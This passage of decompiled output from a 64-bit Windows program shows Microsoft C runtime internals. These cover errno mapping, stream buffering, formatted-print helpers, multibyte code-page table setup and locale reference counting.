  puVar2 = &DAT_14001a4e0;
  do {
    if (param_1 == *puVar2) {
      DVar4 = (&DAT_14001a4e4)[(longlong)(int)uVar3 * 2];
      goto LAB_140009cce;
    }
    uVar3 = uVar3 + 1;
    puVar2 = puVar2 + 2;
  } while (uVar3 < 0x2d);
  if (param_1 - 0x13 < 0x12) {
    DVar4 = 0xd;
  }
  else {
    DVar4 = 0x16;
    if (param_1 - 0xbc < 0xf) {
      DVar4 = 8;
    }
  }
LAB_140009cce:
  pDVar1 = FUN_14000b340();
  if (pDVar1 != (DWORD *)0x0) {
    pDVar1[4] = DVar4;
    return;
  }
  _DAT_14001a648 = DVar4;
  return;
}




ulonglong FUN_140009cf0(undefined4 param_1,FILE *param_2)

{
  byte bVar1;
  uint uVar2;
  uint uVar3;
  DWORD *pDVar4;
  undefined **ppuVar5;
  undefined7 extraout_var;
  longlong lVar6;
  undefined *puVar7;
  uint uVar8;
  undefined4 local_res8 [2];
  
  local_res8[0] = param_1;
  uVar2 = FUN_14000fe60((longlong)param_2);
  uVar8 = param_2->_flag;
  if ((uVar8 & 0x82) == 0) {
    pDVar4 = FUN_140009c00();
    *pDVar4 = 9;
    param_2->_flag = param_2->_flag | 0x20;
    return 0xffffffff;
  }
  if ((uVar8 & 0x40) != 0) {
    pDVar4 = FUN_140009c00();
    *pDVar4 = 0x22;
    param_2->_flag = param_2->_flag | 0x20;
    return 0xffffffff;
  }
  uVar3 = 0;
  if ((uVar8 & 1) != 0) {
    param_2->_cnt = 0;
    if ((uVar8 & 0x10) == 0) {
      param_2->_flag = uVar8 | 0x20;
      return 0xffffffff;
    }
    param_2->_ptr = param_2->_base;
    param_2->_flag = uVar8 & 0xfffffffe;
  }
  uVar8 = param_2->_flag;
  param_2->_cnt = 0;
  param_2->_flag = uVar8 & 0xffffffef | 2;
  if (((uVar8 & 0x10c) == 0) &&
     (((ppuVar5 = FUN_140008850(), param_2 != (FILE *)(ppuVar5 + 6) &&
       (ppuVar5 = FUN_140008850(), param_2 != (FILE *)(ppuVar5 + 0xc))) ||
      (bVar1 = FUN_14000fde0(uVar2), (int)CONCAT71(extraout_var,bVar1) == 0)))) {
    _getbuf(param_2);
  }
  if ((param_2->_flag & 0x108U) == 0) {
    uVar8 = 1;
    uVar3 = FUN_140011e90(uVar2,(WCHAR *)local_res8,1);
  }
  else {
    uVar8 = *(int *)&param_2->_ptr - *(int *)&param_2->_base;
    param_2->_ptr = (char *)((longlong)param_2->_base + 1);
    param_2->_cnt = param_2->_bufsiz + -1;
    if ((int)uVar8 < 1) {
      if ((uVar2 == 0xffffffff) || (uVar2 == 0xfffffffe)) {
        puVar7 = &DAT_14001af90;
      }
      else {
        puVar7 = (undefined *)
                 ((ulonglong)(uVar2 & 0x1f) * 0x50 + (&DAT_14001c4e0)[(longlong)(int)uVar2 >> 5]);
      }
      if (((puVar7[8] & 0x20) != 0) && (lVar6 = FUN_1400115b0(uVar2,0,2), lVar6 == -1))
      goto LAB_140009e93;
      *param_2->_base = (byte)local_res8[0];
    }
    else {
      uVar3 = FUN_140011e90(uVar2,(WCHAR *)param_2->_base,uVar8);
      *param_2->_base = (byte)local_res8[0];
    }
  }
  if (uVar3 == uVar8) {
    return (ulonglong)(byte)local_res8[0];
  }
LAB_140009e93:
  param_2->_flag = param_2->_flag | 0x20;
  return 0xffffffff;
}




ulonglong FUN_140009ec0(undefined *param_1,char *param_2,ulonglong param_3,longlong param_4,
                       undefined8 param_5,undefined8 param_6)

{
  DWORD *pDVar1;
  ulonglong uVar2;
  ulonglong uVar3;
  FILE local_38;
  
  if ((param_4 == 0) || ((param_3 != 0 && (param_2 == (char *)0x0)))) {
    pDVar1 = FUN_140009c00();
    *pDVar1 = 0x16;
    FUN_1400072d0(0,0,0,0,0);
    return 0xffffffff;
  }
  local_38._cnt = (int)param_3;
  if (0x7fffffff < param_3) {
    local_38._cnt = 0x7fffffff;
  }
  local_38._flag = 0x42;
  local_38._ptr = param_2;
  local_38._base = param_2;
  uVar2 = (*(code *)param_1)(&local_38,param_4,param_5,param_6);
  if (param_2 != (char *)0x0) {
    if (-1 < (int)uVar2) {
      local_38._cnt = local_38._cnt + -1;
      if (-1 < local_38._cnt) {
        *local_38._ptr = '\0';
        return uVar2 & 0xffffffff;
      }
      uVar3 = FUN_140009cf0(0,&local_38);
      if ((int)uVar3 != -1) {
        return uVar2 & 0xffffffff;
      }
    }
    param_2[param_3 - 1] = '\0';
    uVar2 = (ulonglong)((-1 < local_38._cnt) - 2);
  }
  return uVar2;
}




ulonglong FUN_140009fd0(char *param_1,ulonglong param_2,longlong param_3,undefined8 param_4,
                       undefined8 param_5)

{
  ulonglong uVar1;
  DWORD *pDVar2;
  
  if (((param_3 == 0) || (param_1 == (char *)0x0)) || (param_2 == 0)) {
    pDVar2 = FUN_140009c00();
    *pDVar2 = 0x16;
  }
  else {
    uVar1 = FUN_140009ec0(&DAT_1400104f0,param_1,param_2,param_3,param_4,param_5);
    if ((int)uVar1 < 0) {
      *param_1 = '\0';
    }
    if ((int)uVar1 != -2) {
      return uVar1;
    }
    pDVar2 = FUN_140009c00();
    *pDVar2 = 0x22;
  }
  FUN_1400072d0(0,0,0,0,0);
  return 0xffffffff;
}




void FUN_14000a060(longlong param_1)

{
  undefined1 *puVar1;
  ulonglong *puVar2;
  longlong lVar3;
  
  lVar3 = 0x101;
  FUN_140006070((ulonglong *)(param_1 + 0x1c),0,0x101);
  *(undefined4 *)(param_1 + 4) = 0;
  *(undefined4 *)(param_1 + 8) = 0;
  *(undefined4 *)(param_1 + 0xc) = 0;
  *(undefined8 *)(param_1 + 0x10) = 0;
  *(undefined4 *)(param_1 + 0x18) = 0;
  puVar2 = (ulonglong *)(param_1 + 0x1c);
  do {
    lVar3 = lVar3 + -1;
    *(undefined1 *)puVar2 = *(undefined1 *)(((longlong)&DAT_14001a650 - param_1) + (longlong)puVar2)
    ;
    puVar2 = (ulonglong *)((longlong)puVar2 + 1);
  } while (lVar3 != 0);
  lVar3 = 0x80;
  puVar1 = (undefined1 *)(param_1 + 0x11d);
  do {
    lVar3 = lVar3 + -1;
    *puVar1 = puVar1[(longlong)&DAT_14001a650 - param_1];
    puVar1[1] = (puVar1 + 2)[0x14001a64f - param_1];
    puVar1 = puVar1 + 2;
  } while (lVar3 != 0);
  return;
}




void FUN_14000a110(longlong param_1)

{
  BYTE *pBVar1;
  byte bVar2;
  BOOL BVar3;
  uint uVar4;
  byte *pbVar6;
  int iVar7;
  ulonglong *puVar8;
  ulonglong uVar9;
  BYTE *pBVar10;
  longlong lVar11;
  ushort *puVar12;
  undefined1 auStackY_588 [32];
  _cpinfo local_538;
  ulonglong local_518 [32];
  byte local_418 [256];
  byte local_318 [256];
  WORD local_218 [256];
  ulonglong local_18;
  ulonglong uVar5;
  
  local_18 = DAT_14001a0b0 ^ (ulonglong)auStackY_588;
  BVar3 = GetCPInfo(*(UINT *)(param_1 + 4),&local_538);
  if (BVar3 == 0) {
    uVar4 = 0;
    pbVar6 = (byte *)(param_1 + 0x1d);
    do {
      if (uVar4 - 0x41 < 0x1a) {
        *pbVar6 = *pbVar6 | 0x10;
        pbVar6[0x100] = (char)uVar4 + 0x20;
      }
      else if (uVar4 - 0x61 < 0x1a) {
        *pbVar6 = *pbVar6 | 0x20;
        pbVar6[0x100] = (char)uVar4 - 0x20;
      }
      else {
        pbVar6[0x100] = 0;
      }
      uVar4 = uVar4 + 1;
      pbVar6 = pbVar6 + 1;
    } while (uVar4 < 0x100);
  }
  else {
    uVar9 = 0;
    puVar8 = local_518;
    lVar11 = 0x100;
    uVar5 = uVar9;
    do {
      *(char *)puVar8 = (char)uVar5;
      uVar4 = (int)uVar5 + 1;
      uVar5 = (ulonglong)uVar4;
      puVar8 = (ulonglong *)((longlong)puVar8 + 1);
    } while (uVar4 < 0x100);
    local_518[0]._0_1_ = 0x20;
    pBVar10 = local_538.LeadByte;
    while (local_538.LeadByte[0] != 0) {
      if ((uint)local_538.LeadByte[0] <= (uint)pBVar10[1]) {
        iVar7 = (uint)pBVar10[1] - (uint)local_538.LeadByte[0];
        FUN_140006070((ulonglong *)((longlong)local_518 + (ulonglong)local_538.LeadByte[0]),
                      CONCAT71((uint7)(uint3)((uint)iVar7 >> 8),0x20),(ulonglong)(iVar7 + 1));
      }
      pBVar1 = pBVar10 + 2;
      pBVar10 = pBVar10 + 2;
      local_538.LeadByte[0] = *pBVar1;
    }
    FUN_1400122a0((longlong *)0x0,1,(LPCSTR)local_518,0x100,local_218,*(UINT *)(param_1 + 4),
                  *(LCID *)(param_1 + 0xc),0);
    FUN_14000bf50((longlong *)0x0,*(LCID *)(param_1 + 0xc),0x100,(LPCSTR)local_518,0x100,
                  (LPSTR)local_418,0x100,*(UINT *)(param_1 + 4),0);
    FUN_14000bf50((longlong *)0x0,*(LCID *)(param_1 + 0xc),0x200,(LPCSTR)local_518,0x100,
                  (LPSTR)local_318,0x100,*(UINT *)(param_1 + 4),0);
    puVar12 = local_218;
    pbVar6 = (byte *)(param_1 + 0x1d);
    do {
      if ((*puVar12 & 1) == 0) {
        if ((*puVar12 & 2) == 0) {
          pbVar6[0x100] = 0;
        }
        else {
          bVar2 = local_318[uVar9];
          *pbVar6 = *pbVar6 | 0x20;
          pbVar6[0x100] = bVar2;
        }
      }
      else {
        bVar2 = local_418[uVar9];
        *pbVar6 = *pbVar6 | 0x10;
        pbVar6[0x100] = bVar2;
      }
      pbVar6 = pbVar6 + 1;
      uVar9 = uVar9 + 1;
      puVar12 = puVar12 + 1;
      lVar11 = lVar11 + -1;
    } while (lVar11 != 0);
  }
  __security_check_cookie(local_18 ^ (ulonglong)auStackY_588);
  return;
}




/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */
/* Library Function - Single Match
    __updatetmbcinfo
   
   Library: Visual Studio 2008 Release */

pthreadmbcinfo __cdecl __updatetmbcinfo(void)

{
  DWORD *pDVar1;
  pthreadmbcinfo ptVar2;
  
  pDVar1 = FUN_14000b3d0();
  if (((_DAT_14001ab88 & pDVar1[0x32]) == 0) || (*(longlong *)(pDVar1 + 0x30) == 0)) {
    _lock(0xd);
    ptVar2 = *(pthreadmbcinfo *)(pDVar1 + 0x2e);
    if (ptVar2 != (pthreadmbcinfo)PTR_DAT_14001aa80) {
      if (ptVar2 != (pthreadmbcinfo)0x0) {
        LOCK();
        ptVar2->refcount = ptVar2->refcount + -1;
        UNLOCK();
        if ((ptVar2->refcount == 0) && (ptVar2 != (pthreadmbcinfo)&DAT_14001a650)) {
          FUN_14000b9c0(ptVar2);
        }
      }
      *(undefined **)(pDVar1 + 0x2e) = PTR_DAT_14001aa80;
      ptVar2 = (pthreadmbcinfo)PTR_DAT_14001aa80;
      LOCK();
      *(int *)PTR_DAT_14001aa80 = *(int *)PTR_DAT_14001aa80 + 1;
      UNLOCK();
    }
    FUN_14000fc60(0xd);
  }
  else {
    ptVar2 = *(pthreadmbcinfo *)(pDVar1 + 0x2e);
  }
  if (ptVar2 == (pthreadmbcinfo)0x0) {
    _amsg_exit(0x20);
  }
  return ptVar2;
}




void FUN_14000a3f0(void)

{
  FUN_14000fc60(0xd);
  return;
}




/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

UINT FUN_14000a410(UINT param_1)

{
  undefined *puVar1;
  UINT UVar2;
  DWORD *pDVar3;
  pthreadlocinfo ptVar4;
  bool bVar5;
  
  pDVar3 = FUN_14000b3d0();
  ptVar4 = *(pthreadlocinfo *)(pDVar3 + 0x30);
  puVar1 = *(undefined **)(pDVar3 + 0x2e);
  if ((ptVar4 != (pthreadlocinfo)PTR_DAT_14001ad00) && ((_DAT_14001ab88 & pDVar3[0x32]) == 0)) {
    ptVar4 = __updatetlocinfo();
  }
  if ((puVar1 != PTR_DAT_14001aa80) && ((_DAT_14001ab88 & pDVar3[0x32]) == 0)) {
    __updatetmbcinfo();
  }
  bVar5 = (pDVar3[0x32] & 2) == 0;
  if (bVar5) {
    pDVar3[0x32] = pDVar3[0x32] | 2;
  }
  DAT_14001bbd8 = 0;
  if (param_1 == 0xfffffffe) {
    DAT_14001bbd8 = 1;
    UVar2 = GetOEMCP();
  }
  else if (param_1 == 0xfffffffd) {
    DAT_14001bbd8 = 1;
    UVar2 = GetACP();
  }
  else {
    if (param_1 != 0xfffffffc) {
      if (!bVar5) {
        DAT_14001bbd8 = 0;
        return param_1;
      }
      pDVar3[0x32] = pDVar3[0x32] & 0xfffffffd;
      return param_1;
    }
    UVar2 = ptVar4->lc_codepage;
    DAT_14001bbd8 = 1;
  }
  if (bVar5) {
    pDVar3[0x32] = pDVar3[0x32] & 0xfffffffd;
  }
  return UVar2;
}




void FUN_14000a520(UINT param_1,longlong param_2)

{
  byte bVar1;
  byte bVar2;
  int iVar3;
  UINT CodePage;
  BOOL BVar4;
  UINT *pUVar5;
  byte *pbVar6;
  uint uVar7;
  undefined1 *puVar8;
  byte *pbVar10;
  BYTE *pBVar11;
  undefined4 uVar12;
  longlong lVar13;
  ulonglong *puVar14;
  byte *pbVar15;
  byte *pbVar16;
  ulonglong uVar17;
  undefined1 auStack_68 [32];
  _cpinfo local_48;
  ulonglong local_30;
  ulonglong uVar9;
  
  local_30 = DAT_14001a0b0 ^ (ulonglong)auStack_68;
  CodePage = FUN_14000a410(param_1);
  if (CodePage != 0) {
    uVar9 = 0;
    uVar12 = 0;
    pUVar5 = &DAT_14001aa90;
    uVar17 = uVar9;
LAB_14000a5f0:
    if (*pUVar5 != CodePage) goto code_r0x00014000a5f8;
    FUN_140006070((ulonglong *)(param_2 + 0x1c),0,0x101);
    pbVar16 = &DAT_14001aa88;
    lVar13 = 4;
    pbVar6 = &DAT_14001aaa0 + uVar17 * 0x30;
    do {
      bVar1 = *pbVar6;
      pbVar15 = pbVar6;
      while ((bVar1 != 0 && (pbVar15[1] != 0))) {
        uVar9 = (ulonglong)*pbVar15;
        if (*pbVar15 <= pbVar15[1]) {
          pbVar10 = (byte *)(uVar9 + 0x1d + param_2);
          do {
            uVar7 = (int)uVar9 + 1;
            uVar9 = (ulonglong)uVar7;
            *pbVar10 = *pbVar10 | *pbVar16;
            pbVar10 = pbVar10 + 1;
          } while (uVar7 <= pbVar15[1]);
        }
        pbVar15 = pbVar15 + 2;
        bVar1 = *pbVar15;
      }
      pbVar6 = pbVar6 + 8;
      pbVar16 = pbVar16 + 1;
      lVar13 = lVar13 + -1;
    } while (lVar13 != 0);
    *(UINT *)(param_2 + 4) = CodePage;
    *(undefined4 *)(param_2 + 8) = 1;
    if (CodePage == 0x3a4) {
      uVar12 = 0x411;
    }
    else if (CodePage == 0x3a8) {
      uVar12 = 0x804;
    }
    else if (CodePage == 0x3b5) {
      uVar12 = 0x412;
    }
    else if (CodePage == 0x3b6) {
      uVar12 = 0x404;
    }
    *(undefined4 *)(param_2 + 0xc) = uVar12;
    *(undefined2 *)(param_2 + 0x10) = (&DAT_14001aa94)[uVar17 * 0x18];
    *(undefined2 *)(param_2 + 0x12) = (&DAT_14001aa96)[uVar17 * 0x18];
    *(undefined2 *)(param_2 + 0x14) = (&DAT_14001aa98)[uVar17 * 0x18];
    *(undefined2 *)(param_2 + 0x16) = (&DAT_14001aa9a)[uVar17 * 0x18];
    *(undefined2 *)(param_2 + 0x18) = (&DAT_14001aa9c)[uVar17 * 0x18];
    *(undefined2 *)(param_2 + 0x1a) = (&DAT_14001aa9e)[uVar17 * 0x18];
    goto LAB_14000a8af;
  }
  lVar13 = 0x101;
  FUN_140006070((ulonglong *)(param_2 + 0x1c),0,0x101);
  *(undefined4 *)(param_2 + 4) = 0;
  *(undefined4 *)(param_2 + 8) = 0;
  *(undefined4 *)(param_2 + 0xc) = 0;
  *(undefined8 *)(param_2 + 0x10) = 0;
  *(undefined4 *)(param_2 + 0x18) = 0;
  puVar14 = (ulonglong *)(param_2 + 0x1c);
  do {
    lVar13 = lVar13 + -1;
    *(undefined1 *)puVar14 =
         *(undefined1 *)(((longlong)&DAT_14001a650 - param_2) + (longlong)puVar14);
    puVar14 = (ulonglong *)((longlong)puVar14 + 1);
  } while (lVar13 != 0);
  lVar13 = 0x80;
  puVar8 = (undefined1 *)(param_2 + 0x11d);
  do {
    lVar13 = lVar13 + -1;
    *puVar8 = puVar8[(longlong)&DAT_14001a650 - param_2];
    puVar8[1] = (puVar8 + 2)[0x14001a64f - param_2];
    puVar8 = puVar8 + 2;
  } while (lVar13 != 0);
LAB_14000a8c6:
  __security_check_cookie(local_30 ^ (ulonglong)auStack_68);
  return;
code_r0x00014000a5f8:
  uVar7 = (int)uVar9 + 1;
  uVar9 = (ulonglong)uVar7;
  uVar17 = uVar17 + 1;
  pUVar5 = pUVar5 + 0xc;
  if (4 < uVar7) goto code_r0x00014000a608;
  goto LAB_14000a5f0;
code_r0x00014000a608:
  if (((CodePage != 65000) && (CodePage != 0xfde9)) &&
     (BVar4 = IsValidCodePage(CodePage & 0xffff), BVar4 != 0)) {
    BVar4 = GetCPInfo(CodePage,&local_48);
    if (BVar4 == 0) {
      if (DAT_14001bbd8 != 0) {
        FUN_14000a060(param_2);
      }
    }
    else {
      FUN_140006070((ulonglong *)(param_2 + 0x1c),0,0x101);
      *(UINT *)(param_2 + 4) = CodePage;
      *(undefined4 *)(param_2 + 0xc) = 0;
      if (local_48.MaxCharSize < 2) {
        *(undefined4 *)(param_2 + 8) = 0;
        *(undefined8 *)(param_2 + 0x10) = 0;
        *(undefined4 *)(param_2 + 0x18) = 0;
      }
      else {
        pBVar11 = local_48.LeadByte;
        while ((local_48.LeadByte[0] != 0 && (bVar1 = pBVar11[1], bVar1 != 0))) {
          bVar2 = *pBVar11;
          if ((uint)bVar2 <= (uint)bVar1) {
            pbVar6 = (byte *)((ulonglong)bVar2 + 0x1d + param_2);
            uVar17 = (ulonglong)(((uint)bVar1 - (uint)bVar2) + 1);
            do {
              *pbVar6 = *pbVar6 | 4;
              pbVar6 = pbVar6 + 1;
              uVar17 = uVar17 - 1;
            } while (uVar17 != 0);
          }
          pBVar11 = pBVar11 + 2;
          local_48.LeadByte[0] = *pBVar11;
        }
        pbVar6 = (byte *)(param_2 + 0x1f);
        lVar13 = 0x7f;
        do {
          pbVar6[-1] = pbVar6[-1] | 8;
          *pbVar6 = *pbVar6 | 8;
          pbVar6 = pbVar6 + 2;
          lVar13 = lVar13 + -1;
        } while (lVar13 != 0);
        iVar3 = *(int *)(param_2 + 4);
        if (iVar3 == 0x3a4) {
          *(undefined4 *)(param_2 + 8) = 1;
          *(undefined4 *)(param_2 + 0xc) = 0x411;
          *(undefined8 *)(param_2 + 0x10) = 0;
          *(undefined4 *)(param_2 + 0x18) = 0;
        }
        else if (iVar3 == 0x3a8) {
          *(undefined4 *)(param_2 + 8) = 1;
          *(undefined4 *)(param_2 + 0xc) = 0x804;
          *(undefined8 *)(param_2 + 0x10) = 0;
          *(undefined4 *)(param_2 + 0x18) = 0;
        }
        else if (iVar3 == 0x3b5) {
          *(undefined4 *)(param_2 + 8) = 1;
          *(undefined4 *)(param_2 + 0xc) = 0x412;
          *(undefined8 *)(param_2 + 0x10) = 0;
          *(undefined4 *)(param_2 + 0x18) = 0;
        }
        else if (iVar3 == 0x3b6) {
          *(undefined4 *)(param_2 + 8) = 1;
          *(undefined4 *)(param_2 + 0xc) = 0x404;
          *(undefined8 *)(param_2 + 0x10) = 0;
          *(undefined4 *)(param_2 + 0x18) = 0;
        }
        else {
          *(undefined4 *)(param_2 + 8) = 1;
          *(undefined4 *)(param_2 + 0xc) = 0;
          *(undefined8 *)(param_2 + 0x10) = 0;
          *(undefined4 *)(param_2 + 0x18) = 0;
        }
      }
LAB_14000a8af:
      FUN_14000a110(param_2);
    }
  }
  goto LAB_14000a8c6;
}




/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

int FUN_14000a8e0(UINT param_1)

{
  longlong lVar1;
  int *piVar2;
  undefined *puVar3;
  UINT UVar4;
  int iVar5;
  DWORD *pDVar6;
  int *_Dst;
  int iVar7;
  int iVar8;
  
  iVar5 = -1;
  pDVar6 = FUN_14000b3d0();
  __updatetmbcinfo();
  lVar1 = *(longlong *)(pDVar6 + 0x2e);
  UVar4 = FUN_14000a410(param_1);
  if (UVar4 == *(UINT *)(lVar1 + 4)) {
    iVar5 = 0;
  }
  else {
    _Dst = (int *)FUN_14000f600(0x220);
    if (_Dst != (int *)0x0) {
      memcpy(_Dst,*(void **)(pDVar6 + 0x2e),0x220);
      iVar8 = 0;
      *_Dst = 0;
      iVar5 = FUN_14000a520(UVar4,(longlong)_Dst);
      if (iVar5 == 0) {
        piVar2 = *(int **)(pDVar6 + 0x2e);
        LOCK();
        *piVar2 = *piVar2 + -1;
        UNLOCK();
        if ((*piVar2 == 0) && (*(undefined4 **)(pDVar6 + 0x2e) != &DAT_14001a650)) {
          FUN_14000b9c0(*(undefined4 **)(pDVar6 + 0x2e));
        }
        *(int **)(pDVar6 + 0x2e) = _Dst;
        LOCK();
        *_Dst = *_Dst + 1;
        UNLOCK();
        if (((pDVar6[0x32] & 2) == 0) && ((DAT_14001ab88 & 1) == 0)) {
          _lock(0xd);
          _DAT_14001bbec = _Dst[1];
          _DAT_14001bbf0 = _Dst[2];
          _DAT_14001bbf4 = _Dst[3];
          for (iVar7 = 0; iVar7 < 5; iVar7 = iVar7 + 1) {
            (&DAT_14001bbe0)[iVar7] = *(undefined2 *)((longlong)_Dst + (longlong)iVar7 * 2 + 0x10);
          }
          for (iVar7 = 0; iVar7 < 0x101; iVar7 = iVar7 + 1) {
            (&DAT_14001a870)[iVar7] = *(undefined1 *)((longlong)iVar7 + 0x1c + (longlong)_Dst);
          }
          for (; puVar3 = PTR_DAT_14001aa80, iVar8 < 0x100; iVar8 = iVar8 + 1) {
            (&DAT_14001a980)[iVar8] = *(undefined1 *)((longlong)iVar8 + 0x11d + (longlong)_Dst);
          }
          LOCK();
          *(int *)PTR_DAT_14001aa80 = *(int *)PTR_DAT_14001aa80 + -1;
          UNLOCK();
          if ((*(int *)puVar3 == 0) && ((undefined4 *)PTR_DAT_14001aa80 != &DAT_14001a650)) {
            FUN_14000b9c0(PTR_DAT_14001aa80);
          }
          LOCK();
          PTR_DAT_14001aa80 = (undefined *)_Dst;
          *_Dst = *_Dst + 1;
          UNLOCK();
          FUN_14000fc60(0xd);
        }
      }
      else if (iVar5 == -1) {
        if (_Dst != &DAT_14001a650) {
          FUN_14000b9c0(_Dst);
        }
        pDVar6 = FUN_140009c00();
        *pDVar6 = 0x16;
      }
    }
  }
  return iVar5;
}




void FUN_14000aaf0(void)

{
  FUN_14000fc60(0xd);
  return;
}




undefined8 FUN_14000ab10(void)

{
  if (DAT_14001c6f8 == 0) {
    FUN_14000a8e0(0xfffffffd);
    DAT_14001c6f8 = 1;
  }
  return 0;
}




void FUN_14000ab40(LPVOID param_1)

{
  int *piVar1;
  undefined **ppuVar2;
  undefined8 *puVar3;
  longlong lVar4;
  
  if ((((*(undefined ***)((longlong)param_1 + 0x128) != (undefined **)0x0) &&
       (*(undefined ***)((longlong)param_1 + 0x128) != &PTR_DAT_14001b410)) &&
      (*(int **)((longlong)param_1 + 0x110) != (int *)0x0)) &&
     (**(int **)((longlong)param_1 + 0x110) == 0)) {
    piVar1 = *(int **)((longlong)param_1 + 0x120);
    if ((piVar1 != (int *)0x0) && (*piVar1 == 0)) {
      FUN_14000b9c0(piVar1);
      __free_lconv_mon(*(longlong *)((longlong)param_1 + 0x128));
    }
    piVar1 = *(int **)((longlong)param_1 + 0x118);
    if ((piVar1 != (int *)0x0) && (*piVar1 == 0)) {
      FUN_14000b9c0(piVar1);
      __free_lconv_num(*(undefined8 **)((longlong)param_1 + 0x128));
    }
    FUN_14000b9c0(*(LPVOID *)((longlong)param_1 + 0x110));
    FUN_14000b9c0(*(LPVOID *)((longlong)param_1 + 0x128));
  }
  if ((*(int **)((longlong)param_1 + 0x130) != (int *)0x0) &&
     (**(int **)((longlong)param_1 + 0x130) == 0)) {
    FUN_14000b9c0((LPVOID)(*(longlong *)((longlong)param_1 + 0x138) + -0xfe));
    FUN_14000b9c0((LPVOID)(*(longlong *)((longlong)param_1 + 0x148) + -0x80));
    FUN_14000b9c0((LPVOID)(*(longlong *)((longlong)param_1 + 0x150) + -0x80));
    FUN_14000b9c0(*(LPVOID *)((longlong)param_1 + 0x130));
  }
  ppuVar2 = *(undefined ***)((longlong)param_1 + 0x158);
  if ((ppuVar2 != &PTR_DAT_14001b290) && (*(int *)(ppuVar2 + 0x2c) == 0)) {
    __free_lc_time(ppuVar2);
    FUN_14000b9c0(*(LPVOID *)((longlong)param_1 + 0x158));
  }
  puVar3 = (undefined8 *)((longlong)param_1 + 0x58);
  lVar4 = 6;
  do {
    if ((((undefined *)puVar3[-2] != &DAT_14001ab90) &&
        (piVar1 = (int *)*puVar3, piVar1 != (int *)0x0)) && (*piVar1 == 0)) {
      FUN_14000b9c0(piVar1);
    }
    if (((puVar3[-1] != 0) && (piVar1 = (int *)puVar3[1], piVar1 != (int *)0x0)) && (*piVar1 == 0))
    {
      FUN_14000b9c0(piVar1);
    }
    puVar3 = puVar3 + 4;
    lVar4 = lVar4 + -1;
  } while (lVar4 != 0);
  FUN_14000b9c0(param_1);
  return;
}




/* Library Function - Single Match
    __addlocaleref
   
   Library: Visual Studio 2005 Release */

void __addlocaleref(int *param_1)

{
  int *piVar1;
  int *piVar2;
  longlong lVar3;
  
  LOCK();
  *param_1 = *param_1 + 1;
  UNLOCK();
  piVar2 = *(int **)(param_1 + 0x44);
  if (piVar2 != (int *)0x0) {
    LOCK();
    *piVar2 = *piVar2 + 1;
    UNLOCK();
  }
  piVar2 = *(int **)(param_1 + 0x48);
  if (piVar2 != (int *)0x0) {
    LOCK();
    *piVar2 = *piVar2 + 1;
    UNLOCK();
  }
  piVar2 = *(int **)(param_1 + 0x46);
  if (piVar2 != (int *)0x0) {
    LOCK();
    *piVar2 = *piVar2 + 1;
    UNLOCK();
  }
  piVar2 = *(int **)(param_1 + 0x4c);
  if (piVar2 != (int *)0x0) {
    LOCK();
    *piVar2 = *piVar2 + 1;
    UNLOCK();
  }
  piVar2 = param_1 + 0x16;
  lVar3 = 6;
  do {
    if ((*(undefined **)(piVar2 + -4) != &DAT_14001ab90) &&
       (piVar1 = *(int **)piVar2, piVar1 != (int *)0x0)) {
      LOCK();
      *piVar1 = *piVar1 + 1;
      UNLOCK();
    }
    if ((*(longlong *)(piVar2 + -2) != 0) && (piVar1 = *(int **)(piVar2 + 2), piVar1 != (int *)0x0))
    {
      LOCK();
      *piVar1 = *piVar1 + 1;
      UNLOCK();
    }
    piVar2 = piVar2 + 8;
    lVar3 = lVar3 + -1;
  } while (lVar3 != 0);
  LOCK();
  *(int *)(*(longlong *)(param_1 + 0x56) + 0x160) =
       *(int *)(*(longlong *)(param_1 + 0x56) + 0x160) + 1;
  UNLOCK();
  return;
}




/* Library Function - Single Match
    __removelocaleref
   
   Library: Visual Studio 2005 Release */

int * __removelocaleref(int *param_1)

{
  int *piVar1;
  int *piVar2;
  longlong lVar3;
  
  if (param_1 != (int *)0x0) {
    LOCK();
    *param_1 = *param_1 + -1;
    UNLOCK();
    piVar2 = *(int **)(param_1 + 0x44);
    if (piVar2 != (int *)0x0) {
      LOCK();
      *piVar2 = *piVar2 + -1;
      UNLOCK();
    }
    piVar2 = *(int **)(param_1 + 0x48);
    if (piVar2 != (int *)0x0) {
      LOCK();
      *piVar2 = *piVar2 + -1;
      UNLOCK();
    }
    piVar2 = *(int **)(param_1 + 0x46);
    if (piVar2 != (int *)0x0) {
      LOCK();
      *piVar2 = *piVar2 + -1;
      UNLOCK();
    }
    piVar2 = *(int **)(param_1 + 0x4c);
    if (piVar2 != (int *)0x0) {
      LOCK();
      *piVar2 = *piVar2 + -1;
      UNLOCK();
    }
    piVar2 = param_1 + 0x16;
    lVar3 = 6;
    do {
      if ((*(undefined **)(piVar2 + -4) != &DAT_14001ab90) &&
         (piVar1 = *(int **)piVar2, piVar1 != (int *)0x0)) {
        LOCK();
        *piVar1 = *piVar1 + -1;
        UNLOCK();
      }
      if ((*(longlong *)(piVar2 + -2) != 0) &&
         (piVar1 = *(int **)(piVar2 + 2), piVar1 != (int *)0x0)) {
        LOCK();
        *piVar1 = *piVar1 + -1;
        UNLOCK();
      }
      piVar2 = piVar2 + 8;
      lVar3 = lVar3 + -1;
    } while (lVar3 != 0);
    LOCK();
    *(int *)(*(longlong *)(param_1 + 0x56) + 0x160) =
         *(int *)(*(longlong *)(param_1 + 0x56) + 0x160) + -1;
    UNLOCK();
  }
  return param_1;
}




/* Library Function - Single Match
    _updatetlocinfoEx_nolock
   
   Library: Visual Studio 2005 Release */

int * _updatetlocinfoEx_nolock(longlong *param_1,int *param_2)

{
  int *piVar1;
  int *piVar2;
  
  if ((param_2 != (int *)0x0) && (param_1 != (longlong *)0x0)) {
    piVar1 = (int *)*param_1;
    if (piVar1 != param_2) {
      *param_1 = (longlong)param_2;
      __addlocaleref(param_2);
      if (piVar1 != (int *)0x0) {
        piVar2 = piVar1;
        __removelocaleref(piVar1);
        if ((*piVar2 == 0) && (piVar2 != (int *)&DAT_14001aba0)) {
          FUN_14000ab40(piVar1);
        }
      }
    }
    return param_2;
  }
  return (int *)0x0;
}




/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */
/* Library Function - Single Match
    __updatetlocinfo
   
   Library: Visual Studio 2005 Release */

pthreadlocinfo __cdecl __updatetlocinfo(void)

{
  DWORD *pDVar1;
  pthreadlocinfo ptVar2;
  
  pDVar1 = FUN_14000b3d0();
  if (((_DAT_14001ab88 & pDVar1[0x32]) == 0) || (*(longlong *)(pDVar1 + 0x30) == 0)) {
    _lock(0xc);
    ptVar2 = (pthreadlocinfo)
